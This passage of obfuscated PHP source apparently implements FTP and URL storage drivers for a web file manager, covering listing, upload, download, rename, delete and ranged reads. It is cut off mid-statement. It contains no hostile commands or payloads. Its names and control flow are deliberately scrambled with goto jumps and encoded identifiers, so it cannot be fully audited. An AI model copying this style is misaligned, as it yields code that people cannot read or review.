$Fóâ≥≠È¿∂[$bﬁÙêÔÑá≤] = array($fÎ…π˜ôﬁë[1127] => $this->connect, $fÎ…π˜ôﬁë[166] => $this->host, $fÎ…π˜ôﬁë[165] => $this->scheme, $fÎ…π˜ôﬁë[167] => $this->port); goto eñåß—¯ºΩ; BÃ·úâÂ≥ì: if (isset($Fóâ≥≠È¿∂[$bﬁÙêÔÑá≤])) { foreach ($Fóâ≥≠È¿∂[$bﬁÙêÔÑá≤] as $f≠üØ∫∑Î÷ => $bÛõ£“ç¿∞) { $this->{$f≠üØ∫∑Î÷} = $bÛõ£“ç¿∞; } return !0; } $Aº≤“∏ﬁ”≠ = parse_url(trim($this->server, $fÎ…π˜ôﬁë[8])); $this->host = $Aº≤“∏ﬁ”≠[$fÎ…π˜ôﬁë[166]]; goto d‚ôåÆêîÕ; AüâÇñ“ò€: foreach ($e∫é±∏¶çì as $f≠üØ∫∑Î÷ => $bÛõ£“ç¿∞) { if (isset($this->{$f≠üØ∫∑Î÷})) { $this->{$f≠üØ∫∑Î÷} = $bÛõ£“ç¿∞; } } static $Fóâ≥≠È¿∂ = array(); $bﬁÙêÔÑá≤ = md5(json_encode($e∫é±∏¶çì)); goto BÃ·úâÂ≥ì; eøÆˆΩÌã◊: $fÎ…π˜ôﬁë =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!function_exists($fÎ…π˜ôﬁë[1122])) { show_json(LNG($fÎ…π˜ôﬁë[1123]), !1); } $this->charsetReset($e∫é±∏¶çì); goto AüâÇñ“ò€; d‚ôåÆêîÕ: $A¬‘≥π‘«Ÿ = isset($Aº≤“∏ﬁ”≠[$fÎ…π˜ôﬁë[165]]) && $Aº≤“∏ﬁ”≠[$fÎ…π˜ôﬁë[165]] == $fÎ…π˜ôﬁë[1124] ? !0 : !1; $this->scheme = $A¬‘≥π‘«Ÿ ? $fÎ…π˜ôﬁë[1125] : $fÎ…π˜ôﬁë[1126]; $this->port = isset($Aº≤“∏ﬁ”≠[$fÎ…π˜ôﬁë[167]]) ? $Aº≤“∏ﬁ”≠[$fÎ…π˜ôﬁë[167]] : 21; goto Fúò€¥“ß∆; c®àØŒ“í≤: } private function _isconn() { return is_resource($this->connect); } public function mkfile($Dƒûµ∆∑¨ó, $cØâè¨õÔå = '', $BÍª∞«∆¯‰ = REPEAT_RENAME) { if ($this->setContent($Dƒûµ∆∑¨ó, $cØâè¨õÔå)) { return $this->getPathOuter($Dƒûµ∆∑¨ó); } return !1; } public function mkdir($Bﬁûò¢Ñ‡é, $b…úØ≠éÈâ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Bﬁûò¢Ñ‡é = $this->iconvSystem($Bﬁûò¢Ñ‡é); if ($this->isFolder($Bﬁûò¢Ñ‡é) || @ftp_mkdir($this->connect, $Bﬁûò¢Ñ‡é)) { return $this->getPathOuter($Bﬁûò¢Ñ‡é); } if (!$this->mkdir($this->pathFather($Bﬁûò¢Ñ‡é))) { return !1; } if ($Bﬁûò¢Ñ‡é = @ftp_mkdir($this->connect, $Bﬁûò¢Ñ‡é)) { return $this->getPathOuter($Bﬁûò¢Ñ‡é); } return !1; } public function copyFile($fÓµäÓÿÓﬂ, $Cèù∏âÆœı) { goto eÔ¶æåèÕ√; D¶¶‹∏Æ«ﬁ: $this->tempFileRemve($bÎÂ±Ëáó€); return $Bá∂ÆŸËÖê; goto aÈ€Á∫Ö«; eÔ¶æåèÕ√: if (!$this->_isconn()) { return !1; } $DàïÛªÛﬁì = $this->pathThis($this->iconvSystem($fÓµäÓÿÓﬂ)); $bÎÂ±Ëáó€ = $this->tempFile($DàïÛªÛﬁì); goto dùËßå€ãå; dùËßå€ãå: $f‡ÏÍôÚºÃ = $this->iconvApp($bÎÂ±Ëáó€); $this->download($fÓµäÓÿÓﬂ, $f‡ÏÍôÚºÃ); $Bá∂ÆŸËÖê = $this->upload($Cèù∏âÆœı, $f‡ÏÍôÚºÃ); goto D¶¶‹∏Æ«ﬁ; aÈ€Á∫Ö«: } public function moveFile($Dç˜∞»¨–Æ, $fáπêâ ﬁ) { if (!$this->_isconn()) { return !1; } $Dç˜∞»¨–Æ = $this->iconvSystem($Dç˜∞»¨–Æ); $fáπêâ ﬁ = $this->iconvSystem($fáπêâ ﬁ); $AÇÀŒÀ˜ä¯ = @ftp_rename($this->connect, $Dç˜∞»¨–Æ, $fáπêâ ﬁ); return $AÇÀŒÀ˜ä¯ ? $this->getPathOuter($fáπêâ ﬁ) : !1; } public function delFile($Aû∂Ñ–«Øı) { if (!$this->_isconn()) { return !1; } $Aû∂Ñ–«Øı = $this->iconvSystem($Aû∂Ñ–«Øı); return @ftp_delete($this->connect, $Aû∂Ñ–«Øı); } public function delFolder($cØ¨◊™í«¿) { if (!$this->_isconn()) { return !1; } $cØ¨◊™í«¿ = $this->iconvSystem($cØ¨◊™í«¿); $aﬁ‰÷ö©—ë = $this->ftpList($cØ¨◊™í«¿); if (!$aﬁ‰÷ö©—ë) { return @ftp_rmdir($this->connect, $cØ¨◊™í«¿); } foreach ($aﬁ‰÷ö©—ë as $Bß·¨âáﬂ©) { if ($this->isFolder($Bß·¨âáﬂ©)) { $Bß·¨âáﬂ© = $this->iconvApp($Bß·¨âáﬂ©); $this->delFolder($Bß·¨âáﬂ©); } else { @ftp_delete($this->connect, $Bß·¨âáﬂ©); } } return @ftp_rmdir($this->connect, $cØ¨◊™í«¿); } public function rename($cµˆπ∏††, $CàâÌ•Ëë) { goto E‚Ùì¬Õ´ﬁ; E„ïö∫ÎçÖ: $a˜§Ù‚µ∞ë = rtrim($eﬁßÑ∞üâ”, $eıù◊ùÙŒ[8]) . $eıù◊ùÙŒ[8] . $Dæ¨êîë°⁄; $CõÜùûŸ¡È = @ftp_rename($this->connect, $cµˆπ∏††, $a˜§Ù‚µ∞ë); $a˜§Ù‚µ∞ë = $this->iconvApp($a˜§Ù‚µ∞ë); goto d‰≥åîªäÌ; A–ºàÉ¨£ó: $Dæ¨êîë°⁄ = $this->iconvSystem($Dæ¨êîë°⁄); $cµˆπ∏†† = $this->iconvSystem($cµˆπ∏††); $eﬁßÑ∞üâ” = $this->pathFather($cµˆπ∏††); goto E„ïö∫ÎçÖ; E‚Ùì¬Õ´ﬁ: $eıù◊ùÙŒ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->_isconn()) { return !1; } $Dæ¨êîë°⁄ = $this->fileNameAuto($this->pathFather($cµˆπ∏††), $CàâÌ•Ëë); goto A–ºàÉ¨£ó; d‰≥åîªäÌ: return $CõÜùûŸ¡È ? $this->getPathOuter($a˜§Ù‚µ∞ë) : !1; goto AﬂßÓ´¿≈; AﬂßÓ´¿≈: } private function folderInfo($C¯§•”≠Îñ, $E∆Î≤ıÛØ∫ = false) { goto cÖÒòÒ™ãø; cÖÒòÒ™ãø: $E≥ª¬õÑãº =& $_SERVER[£¿ÌÙëü¡¯¯]; $Cœæô≤å›° = $this->getPathOuter(rtrim($C¯§•”≠Îñ, $E≥ª¬õÑãº[8])); $Bø˜óÙŸŸÒ = $this->pathThis($Cœæô≤å›°); goto féËãÆ‘Ø‰; CÜÉ¶å¯Ÿù: return $E¨áŒåÙÃœ; goto CÚÕπœﬂë√; féËãÆ‘Ø‰: $Bõ‡Ù∂àÀê = $this->iconvSystem($C¯§•”≠Îñ); if ($E∆Î≤ıÛØ∫) { return array($E≥ª¬õÑãº[28] => $Bø˜óÙŸŸÒ, $E≥ª¬õÑãº[76] => $Cœæô≤å›°, $E≥ª¬õÑãº[29] => $E≥ª¬õÑãº[77]); } $E¨áŒåÙÃœ = array($E≥ª¬õÑãº[28] => $Bø˜óÙŸŸÒ, $E≥ª¬õÑãº[76] => $Cœæô≤å›°, $E≥ª¬õÑãº[29] => $E≥ª¬õÑãº[77], $E≥ª¬õÑãº[184] => 0, $E≥ª¬õÑãº[108] => 0, $E≥ª¬õÑãº[1128] => !0, $E≥ª¬õÑãº[1129] => !0); goto CÜÉ¶å¯Ÿù; CÚÕπœﬂë√: } private function fileInfo($añÂ∫ºô˘, $eµµÒ¿äÍå = false) { goto BëÍë±⁄Ù∫; cÔ…Î≤é´¬: $BûéµÀ»©å[$b°›≠¬Õ™ﬁ[108]] = $BûéµÀ»©å[$b°›≠¬Õ™ﬁ[108]] > 0 ? $BûéµÀ»©å[$b°›≠¬Õ™ﬁ[108]] : 0; return $BûéµÀ»©å; goto b¨¬∂Àñ¨Ø; cÇè§íä…ã: $D°⁄áîô†â = $this->iconvSystem($añÂ∫ºô˘); if ($eµµÒ¿äÍå) { return array($b°›≠¬Õ™ﬁ[28] => $CîãØÉùÕÑ, $b°›≠¬Õ™ﬁ[76] => $C¨É€∂î™î, $b°›≠¬Õ™ﬁ[29] => $b°›≠¬Õ™ﬁ[164], $b°›≠¬Õ™ﬁ[157] => $this->ext($añÂ∫ºô˘), $b°›≠¬Õ™ﬁ[78] => $this->size($añÂ∫ºô˘)); } $BûéµÀ»©å = array($b°›≠¬Õ™ﬁ[28] => $CîãØÉùÕÑ, $b°›≠¬Õ™ﬁ[76] => $C¨É€∂î™î, $b°›≠¬Õ™ﬁ[29] => $b°›≠¬Õ™ﬁ[164], $b°›≠¬Õ™ﬁ[184] => 0, $b°›≠¬Õ™ﬁ[108] => @ftp_mdtm($this->connect, $D°⁄áîô†â), $b°›≠¬Õ™ﬁ[157] => $this->ext($añÂ∫ºô˘), $b°›≠¬Õ™ﬁ[78] => $this->size($añÂ∫ºô˘), $b°›≠¬Õ™ﬁ[1128] => !0, $b°›≠¬Õ™ﬁ[1129] => !0); goto cÔ…Î≤é´¬; BëÍë±⁄Ù∫: $b°›≠¬Õ™ﬁ =& $_SERVER[£¿ÌÙëü¡¯¯]; $C¨É€∂î™î = $this->getPathOuter(rtrim($añÂ∫ºô˘, $b°›≠¬Õ™ﬁ[8])); $CîãØÉùÕÑ = $this->pathThis($C¨É€∂î™î); goto cÇè§íä…ã; b¨¬∂Àñ¨Ø: } public function size($DÖîáı÷‚§) { $B∫†ÍÓëπ = $this->objectMeta($DÖîáı÷‚§); return $B∫†ÍÓëπ ? $B∫†ÍÓëπ[$_SERVER[£¿ÌÙëü¡¯¯][78]] : 0; } public function info($EåÜ˘åì∑ô) { if ($this->isFile($EåÜ˘åì∑ô)) { return $this->fileInfo($EåÜ˘åì∑ô, 0); } else { if ($this->isFolder($EåÜ˘åì∑ô)) { return $this->folderInfo($EåÜ˘åì∑ô); } } return !1; } public function exist($AÊú˜Ù◊±ë) { return $this->objectMeta($AÊú˜Ù◊±ë) ? !0 : !1; } public function isFile($DòÓíﬂÏ”∑) { $d›ñ©âŒ⁄â =& $_SERVER[£¿ÌÙëü¡¯¯]; $CÎÃÀÑ√Ç© = $this->objectMeta($DòÓíﬂÏ”∑); return $CÎÃÀÑ√Ç© ? $CÎÃÀÑ√Ç©[$d›ñ©âŒ⁄â[29]] == $d›ñ©âŒ⁄â[164] : !1; } public function isFolder($e∏æ’´éøã) { $d±Àﬂíï«º =& $_SERVER[£¿ÌÙëü¡¯¯]; $E∆èò‰Ï—í = $this->objectMeta($e∏æ’´éøã); return $E∆èò‰Ï—í ? $E∆èò‰Ï—í[$d±Àﬂíï«º[29]] == $d±Àﬂíï«º[77] : !1; } public function listPath($eáâÇàºêâ, $aœ à∫∫™ó = false) { goto A’Çòà·≠…; A…ˆπßâÆû: $dÛ¶ﬁâä¯∏ = $this->ftpList($eáâÇàºêâ); $cÿÖîßÙÃ« = array($BëÙëÀú∑◊[75] => array(), $BëÙëÀú∑◊[74] => array()); if (!$dÛ¶ﬁâä¯∏) { return $cÿÖîßÙÃ«; } goto Eâ€Ü«î≥Á; A’Çòà·≠…: $BëÙëÀú∑◊ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->_isconn()) { return !1; } $eáâÇàºêâ = $this->iconvSystem($eáâÇàºêâ); goto A…ˆπßâÆû; Eâ€Ü«î≥Á: foreach ($dÛ¶ﬁâä¯∏ as $eáâÇàºêâ) { if ($this->isFolder($eáâÇàºêâ)) { $cÿÖîßÙÃ«[$BëÙëÀú∑◊[75]][] = $this->folderInfo($eáâÇàºêâ, $aœ à∫∫™ó); } else { $cÿÖîßÙÃ«[$BëÙëÀú∑◊[74]][] = $this->fileInfo($eáâÇàºêâ, $aœ à∫∫™ó); } } return $cÿÖîßÙÃ«; goto d∑Ìÿñ¢¬®; d∑Ìÿñ¢¬®: } public function has($cÖ≥©óÛÕâ, $a◊ßÏíÎ≤á = false, $BÈÈÉ∞Ω›ô = true) { goto e¡ΩïÇÿØÓ; DÖ–§‰¿ÔÏ: foreach ($A©ã¯ﬂŸ°° as $cÖ≥©óÛÕâ) { if ($BÈÈÉ∞Ω›ô) { if (!$this->isFolder($cÖ≥©óÛÕâ)) { return !0; } } else { if ($this->isFolder($cÖ≥©óÛÕâ)) { return !0; } } } return !1; goto BªÃÀç∆öë; e¡ΩïÇÿØÓ: $A®¶Œ®≈‚ä =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->_isconn()) { return !1; } $cÖ≥©óÛÕâ = $this->iconvSystem($cÖ≥©óÛÕâ); goto bÖäÉ≤Œ„™; bÖäÉ≤Œ„™: $A©ã¯ﬂŸ°° = $this->ftpList($cÖ≥©óÛÕâ); if (!$A©ã¯ﬂŸ°°) { return !1; } if ($a◊ßÏíÎ≤á) { return array($A®¶Œ®≈‚ä[188] => 0, $A®¶Œ®≈‚ä[189] => count($A©ã¯ﬂŸ°°)); } goto DÖ–§‰¿ÔÏ; BªÃÀç∆öë: } public function listAll($d£§≤ÌÒè“) { goto fƒ≈‘±¶Ï≤; aŸÉã›Ù±å: foreach ($cîÒ∂ó”êê[$C€îŒâ∂ÖÜ[75]] as $DÜÿÿÏÕêè) { $eŒü§Ù°ÒÓ[] = array($C€îŒâ∂ÖÜ[76] => $C€îŒâ∂ÖÜ[8] . trim(str_replace($d£§≤ÌÒè“, $C€îŒâ∂ÖÜ[33], $DÜÿÿÏÕêè), $C€îŒâ∂ÖÜ[8]) . $C€îŒâ∂ÖÜ[8], $C€îŒâ∂ÖÜ[77] => 1, $C€îŒâ∂ÖÜ[78] => 0); } foreach ($cîÒ∂ó”êê[$C€îŒâ∂ÖÜ[74]] as $EÁœ»‚∏ØÁ) { $eŒü§Ù°ÒÓ[] = array($C€îŒâ∂ÖÜ[76] => $C€îŒâ∂ÖÜ[8] . trim(str_replace($d£§≤ÌÒè“, $C€îŒâ∂ÖÜ[33], $EÁœ»‚∏ØÁ), $C€îŒâ∂ÖÜ[8]), $C€îŒâ∂ÖÜ[77] => 0, $C€îŒâ∂ÖÜ[78] => $this->size($EÁœ»‚∏ØÁ)); } return $eŒü§Ù°ÒÓ; goto a“ΩËÈüáº; AÆ–ÿƒÎÎÙ: $cîÒ∂ó”êê = array($C€îŒâ∂ÖÜ[74] => array(), $C€îŒâ∂ÖÜ[75] => array()); $this->recursionFtpFiles($d£§≤ÌÒè“, $cîÒ∂ó”êê); $eŒü§Ù°ÒÓ = array(); goto aŸÉã›Ù±å; fƒ≈‘±¶Ï≤: $C€îŒâ∂ÖÜ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->_isconn()) { return !1; } $d£§≤ÌÒè“ = $this->iconvSystem($d£§≤ÌÒè“); goto AÆ–ÿƒÎÎÙ; a“ΩËÈüáº: } public function getContent($B¨Ω§Óûƒ«) { if (!$this->_isconn()) { return !1; } $B¨Ω§Óûƒ« = $this->iconvSystem($B¨Ω§Óûƒ«); return $this->fileSubstr($B¨Ω§Óûƒ«); } public function setContent($d¨≤œö·Ó£, $EâÊå™ª‡‡ = '') { goto dæÜ∏››ú‘; f»¨Í∂ûÇ¥: return $EÖ°Æ∞©è‰; goto bÃ˜€∆ÃÒÛ; dæÜ∏››ú‘: if (!$this->_isconn()) { return !1; } $båÙ÷µŸÎ” = $this->pathThis($this->iconvSystem($d¨≤œö·Ó£)); $c¯ƒ«Ó±ôÚ = $this->tempFile($båÙ÷µŸÎ”); goto F±íŸë£îã; F±íŸë£îã: file_put_contents($c¯ƒ«Ó±ôÚ, $EâÊå™ª‡‡); $EÖ°Æ∞©è‰ = $this->upload($d¨≤œö·Ó£, $this->iconvApp($c¯ƒ«Ó±ôÚ)); $this->tempFileRemve($c¯ƒ«Ó±ôÚ); goto f»¨Í∂ûÇ¥; bÃ˜€∆ÃÒÛ: } public function fileSubstr($Aãê®ëÀê◊, $fÌ‡ææïäÆ = 0, $aˆäÉï¢àÌ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Aãê®ëÀê◊, $fÌ‡ææïäÆ, $aˆäÉï¢àÌ); } private function ftpRequest($DØ†ßã˜âõ, $a»üÕËçÇﬂ = 0, $DÇâë†Ìø˜ = false) { goto eÇÀÆ†∏ùŒ; d’–ø÷‡≈∂: curl_setopt($a±¥⁄¬ÔÁÏ, CURLOPT_RETURNTRANSFER, 1); $Cì¥ß‰Ìç¯ = curl_exec($a±¥⁄¬ÔÁÏ); curl_close($a±¥⁄¬ÔÁÏ); goto DúÆÙˆÚ©Õ; DúÆÙˆÚ©Õ: return $Cì¥ß‰Ìç¯; goto D†’äÉÉ≈Ï; eÇÀÆ†∏ùŒ: $DØ†ßã˜âõ = $this->iconvSystem($DØ†ßã˜âõ); $F¬ø•äâ‡– = $this->scheme . $this->host . $_SERVER[£¿ÌÙëü¡¯¯][4] . $this->port; $a±¥⁄¬ÔÁÏ = curl_init(); goto FÛå‚ÒÑ©∏; FÛå‚ÒÑ©∏: curl_setopt($a±¥⁄¬ÔÁÏ, CURLOPT_URL, $F¬ø•äâ‡– . $this->pathEncode($DØ†ßã˜âõ)); curl_setopt($a±¥⁄¬ÔÁÏ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($DÇâë†Ìø˜) { $bÁ√õ≈¬• = $a»üÕËçÇﬂ + $DÇâë†Ìø˜ - 1; curl_setopt($a±¥⁄¬ÔÁÏ, CURLOPT_RANGE, "{$a»üÕËçÇﬂ}\55{$bÁ√õ≈¬•}"); } goto d’–ø÷‡≈∂; D†’äÉÉ≈Ï: } public function upload($E¯û µ©Á, $bÕéñ˘÷Ãã, $Bà˜úÜñπä = false, $F€Ö˘¥◊∫” = REPEAT_REPLACE) { goto D¬÷†øúñ≥; Fû›ªè¡ß™: if ($c‹º˜‰ºü‚ != FTP_FINISHED) { return !1; } return $this->getPathOuter($E¯û µ©Á); goto f‚ÑÖÂ üô; D¬÷†øúñ≥: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($E¯û µ©Á))) { return !1; } $E¯û µ©Á = $this->iconvSystem($E¯û µ©Á); goto f©ﬂã»≥÷á; f©ﬂã»≥÷á: $bÕéñ˘÷Ãã = $this->iconvSystem($bÕéñ˘÷Ãã); $c‹º˜‰ºü‚ = ftp_nb_put($this->connect, $E¯û µ©Á, $bÕéñ˘÷Ãã, FTP_BINARY); while ($c‹º˜‰ºü‚ == FTP_MOREDATA) { $c‹º˜‰ºü‚ = ftp_nb_continue($this->connect); } goto Fû›ªè¡ß™; f‚ÑÖÂ üô: } public function download($C√öÖã≠≠ò, $D°öπ€ßÇ‹ = '') { goto E–ºıß‡πÇ; CÂÍ´ó®»ó: $C√öÖã≠≠ò = $this->iconvSystem($C√öÖã≠≠ò); $D°öπ€ßÇ‹ = $this->iconvSystem($D°öπ€ßÇ‹); $A‡∏è‹º∂ﬁ = ftp_nb_get($this->connect, $D°öπ€ßÇ‹, $C√öÖã≠≠ò, FTP_BINARY); goto C®««¶´ìƒ; C®««¶´ìƒ: while ($A‡∏è‹º∂ﬁ == FTP_MOREDATA) { $A‡∏è‹º∂ﬁ = ftp_nb_continue($this->connect); } if ($A‡∏è‹º∂ﬁ != FTP_FINISHED) { return !1; } return $this->iconvApp($D°öπ€ßÇ‹); goto a¥Õœêâ—®; E–ºıß‡πÇ: if (!$this->_isconn()) { return !1; } $Aàƒ±æããî = $this->pathFather($D°öπ€ßÇ‹); if (!IO::mkdir($Aàƒ±æããî)) { return !1; } goto CÂÍ´ó®»ó; a¥Õœêâ—®: } private function ftpList($F∑ÑÌˆ©∆≥) { goto B°∑Ë¥» ¢; B°∑Ë¥» ¢: $d°µ˜õö®À =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->isFolder($F∑ÑÌˆ©∆≥)) { return !1; } @ftp_chdir($this->connect, $d°µ˜õö®À[8]); goto añÓ…°í´Õ; añÓ…°í´Õ: $F∑ÑÌˆ©∆≥ = rtrim($F∑ÑÌˆ©∆≥, $d°µ˜õö®À[8]) . $d°µ˜õö®À[8]; $a√Æêˆ≠ò∆ = @ftp_nlist($this->connect, $F∑ÑÌˆ©∆≥); if ($a√Æêˆ≠ò∆ === !1) { $a√Æêˆ≠ò∆ = @ftp_rawlist($this->connect, $F∑ÑÌˆ©∆≥); foreach ($a√Æêˆ≠ò∆ as $EéÇ¨˜ﬂ˜– => $f«Œ≠ãÒ÷Ë) { $a√Æêˆ≠ò∆[$EéÇ¨˜ﬂ˜–] = end(explode($d°µ˜õö®À[1130], $f«Œ≠ãÒ÷Ë)); } } goto eÑ¢Ã£•üÇ; eÑ¢Ã£•üÇ: $D·œ◊íö†ø = array(); foreach ($a√Æêˆ≠ò∆ as $fﬂòﬂ“ıáÂ) { if ($fﬂòﬂ“ıáÂ == $d°µ˜õö®À[94] || $fﬂòﬂ“ıáÂ == $d°µ˜õö®À[1131]) { continue; } if (!strstr($fﬂòﬂ“ıáÂ, $d°µ˜õö®À[8])) { $fﬂòﬂ“ıáÂ = $F∑ÑÌˆ©∆≥ . ltrim($fﬂòﬂ“ıáÂ, $d°µ˜õö®À[8]); } $D·œ◊íö†ø[] = $this->iconvApp($fﬂòﬂ“ıáÂ); } return $D·œ◊íö†ø; goto d¿ƒ¡µ∂ﬂÛ; d¿ƒ¡µ∂ﬂÛ: } private function recursionFtpFiles($eπ··Æ∑ˆà, &$cç∏øà–¶ô) { $F–ıÜëú÷¿ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->_isconn()) { return !1; } if (!($AºÃÑ¿€µ— = $this->ftpList($eπ··Æ∑ˆà))) { return !1; } foreach ($AºÃÑ¿€µ— as $eπ··Æ∑ˆà) { if ($this->isFolder($eπ··Æ∑ˆà)) { $this->recursionFtpFiles($eπ··Æ∑ˆà, $cç∏øà–¶ô); $cç∏øà–¶ô[$F–ıÜëú÷¿[75]][] = $eπ··Æ∑ˆà; } else { $cç∏øà–¶ô[$F–ıÜëú÷¿[74]][] = $eπ··Æ∑ˆà; } } } private function objectMeta($aÒ∫•¥©ÂÔ) { goto Cìä¬á§Ïû; E˘ùØÑí√ù: $BΩˆ§ÙÜôö = @ftp_size($this->connect, $this->iconvSystem($aÒ∫•¥©ÂÔ)); if ($BΩˆ§ÙÜôö != -1) { $Bó∂†ﬂä‘Ü = array($eÙ‹ß„”Éâ[78] => $BΩˆ§ÙÜôö, $eÙ‹ß„”Éâ[29] => $eÙ‹ß„”Éâ[164]); } else { $A¢á≤Ÿµ⁄ı = @ftp_chdir($this->connect, $this->iconvSystem($aÒ∫•¥©ÂÔ)); $Bó∂†ﬂä‘Ü = $A¢á≤Ÿµ⁄ı ? array($eÙ‹ß„”Éâ[78] => 0, $eÙ‹ß„”Éâ[29] => $eÙ‹ß„”Éâ[77]) : !1; } Cache::set($AπƒƒüÜë¡, $Bó∂†ﬂä‘Ü, 0); goto còáØúùπÔ; còáØúùπÔ: return $Bó∂†ﬂä‘Ü; goto D’ıê»„Ç∫; Cìä¬á§Ïû: $eÙ‹ß„”Éâ =& $_SERVER[£¿ÌÙëü¡¯¯]; $AπƒƒüÜë¡ = $eÙ‹ß„”Éâ[1132] . md5($aÒ∫•¥©ÂÔ); $Bó∂†ﬂä‘Ü = Cache::get($AπƒƒüÜë¡); goto Cúã™Ü˜⁄û; Cúã™Ü˜⁄û: if ($Bó∂†ﬂä‘Ü !== null && $Bó∂†ﬂä‘Ü !== !1) { return $Bó∂†ﬂä‘Ü; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $eÙ‹ß„”Éâ[8]); goto E˘ùØÑí√ù; D’ıê»„Ç∫: } } goto AõÈ‘ò≤ÔÖ; dØ±˘çü…å: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($cÛÎõ•ôÔä = false) { } public function exist($EÆòŸ±ÇÜ±) { $AÛéåº¶¬÷ = $this->info($EÆòŸ±ÇÜ±); return $AÛéåº¶¬÷[$_SERVER[£¿ÌÙëü¡¯¯][185]]; } public function isFile($D»’ı‘±≤±) { $AÖ÷π¬¬·› = $this->info($D»’ı‘±≤±); return $AÖ÷π¬¬·›[$_SERVER[£¿ÌÙëü¡¯¯][185]]; } public function isFolder($C¥ÈÖ’°€°) { return !1; } public function size($AıÃ™ßÎ∫Ê) { $EëòÆ‡Ì∏ = $this->info($AıÃ™ßÎ∫Ê); return $EëòÆ‡Ì∏[$_SERVER[£¿ÌÙëü¡¯¯][78]]; } public function info($c˘¢¢èﬂàÃ) { return $this->infoParse($c˘¢¢èﬂàÃ); } public function infoAuth($A”ç—µ•ïæ) { return $this->infoParse($A”ç—µ•ïæ); } public function infoWithChildren($CÉËÑﬁˆ‰º) { return $this->infoParse($CÉËÑﬁˆ‰º); } public function infoFull($DıÔÔ™•ìü) { return $this->infoParse($DıÔÔ™•ìü); } private function infoParse($dá„ﬁá∞Õ») { $bÕ‹úæı¯í =& $_SERVER[£¿ÌÙëü¡¯¯]; $b∫®„Û∏Ïï = $this->header($dá„ﬁá∞Õ»); if (!$b∫®„Û∏Ïï || !$b∫®„Û∏Ïï[$bÕ‹úæı¯í[676]]) { return !1; } $dì¬ê‚‘âÈ = _get($b∫®„Û∏Ïï, $bÕ‹úæı¯í[322], 0); $b“çÚÛºùﬂ = array($bÕ‹úæı¯í[28] => $b∫®„Û∏Ïï[$bÕ‹úæı¯í[28]], $bÕ‹úæı¯í[76] => $dá„ﬁá∞Õ», $bÕ‹úæı¯í[29] => $bÕ‹úæı¯í[164], $bÕ‹úæı¯í[78] => intval($dì¬ê‚‘âÈ), $bÕ‹úæı¯í[157] => get_path_ext($b∫®„Û∏Ïï[$bÕ‹úæı¯í[28]]), $bÕ‹úæı¯í[1128] => $dì¬ê‚‘âÈ > 0 && $b∫®„Û∏Ïï[$bÕ‹úæı¯í[1208]], $bÕ‹úæı¯í[1129] => !1); return $b“çÚÛºùﬂ; } private function header($EÓ»ßëÕä¯) { if (isset(self::$_cacheHeader[$EÓ»ßëÕä¯])) { return self::$_cacheHeader[$EÓ»ßëÕä¯]; } self::$_cacheHeader[$EÓ»ßëÕä¯] = url_header($EÓ»ßëÕä¯); return self::$_cacheHeader[$EÓ»ßëÕä¯]; } public function hashSimple($A´úì∂‡Õ∂, $BÛ¢“Ù®™å = false) { goto aì•äãáõë; A¬áä–—ä‚: $C ·ì–•´≤ .= $this->fileSubstr($A´úì∂‡Õ∂, $c∏ÖªÊ¯óµ - $dﬂ’™ÂÖ∆”, $dﬂ’™ÂÖ∆”); return md5($C ·ì–•´≤) . $c∏ÖªÊ¯óµ; goto FìﬂÏàÕ©ˆ; aì•äãáõë: $dÑ–àÍ‹Ãº =& $_SERVER[£¿ÌÙëü¡¯¯]; $a∏»≥áåüÔ = $this->info($A´úì∂‡Õ∂); if (!$a∏»≥áåüÔ || !$a∏»≥áåüÔ[$dÑ–àÍ‹Ãº[185]]) { return !1; } goto eûÈ∂ûÌÇ∫; BÓûÆº‡‚ﬁ: $CïÚË„‚·  = timeFloat(); $d™¢≤Æ»¡¿ = 15; for ($a‰µ≥Ãêµ‹ = 0; $a‰µ≥Ãêµ‹ < $c‚à ≥∂„á; $a‰µ≥Ãêµ‹++) { if (timeFloat() - $CïÚË„‚·  > $d™¢≤Æ»¡¿) { return !1; } $F°êáãΩ∞™ = $this->fileSubstr($A´úì∂‡Õ∂, $aäõãêøíà * $a‰µ≥Ãêµ‹, $dﬂ’™ÂÖ∆”); if (!$F°êáãΩ∞™) { return !1; } $C ·ì–•´≤ .= $F°êáãΩ∞™; } goto A¬áä–—ä‚; eûÈ∂ûÌÇ∫: $c∏ÖªÊ¯óµ = $a∏»≥áåüÔ[$dÑ–àÍ‹Ãº[78]]; $dﬂ’™ÂÖ∆” = 200; $c‚à ≥∂„á = 50; goto d“Íç´∫Ùè; d“Íç´∫Ùè: if ($c∏ÖªÊ¯óµ <= $dﬂ’™ÂÖ∆” * $c‚à ≥∂„á) { return md5($this->fileSubstr($A´úì∂‡Õ∂, 0, $c∏ÖªÊ¯óµ)) . $c∏ÖªÊ¯óµ; } $aäõãêøíà = intval($c∏ÖªÊ¯óµ / $c‚à ≥∂„á); $C ·ì–•´≤ = $dÑ–àÍ‹Ãº[33]; goto BÓûÆº‡‚ﬁ; FìﬂÏàÕ©ˆ: } public function getContent($AµΩ¢ ≠ìü) { return $this->fileSubstr($AµΩ¢ ≠ìü); } public function fileSubstr($F©£Ω€† π, $F¶†≥ßï’ê = 0, $F‚‘Áè‚Ê∏ = -1) { goto cùíŸ§ãàˆ; BÍäÇ€≠æÉ: $cÑÖÁæü˘ = url_request($F©£Ω€† π, $cÛòﬁáŒï≥[213], !1, $F…»«¬™™•, !1, !1, 1); return $cÑÖÁæü˘[$cÛòﬁáŒï≥[1009]] ? $cÑÖÁæü˘[$cÛòﬁáŒï≥[1009]] : $cÛòﬁáŒï≥[33]; goto fŒñÖﬁ≠¥á; fî∞Ù®ò∆: if ($F‚‘Áè‚Ê∏ === -1) { $F‚‘Áè‚Ê∏ = $Dë¢ÙŸîõò[$cÛòﬁáŒï≥[78]]; } if ($F‚‘Áè‚Ê∏ == 0) { return $cÛòﬁáŒï≥[33]; } $F…»«¬™™• = 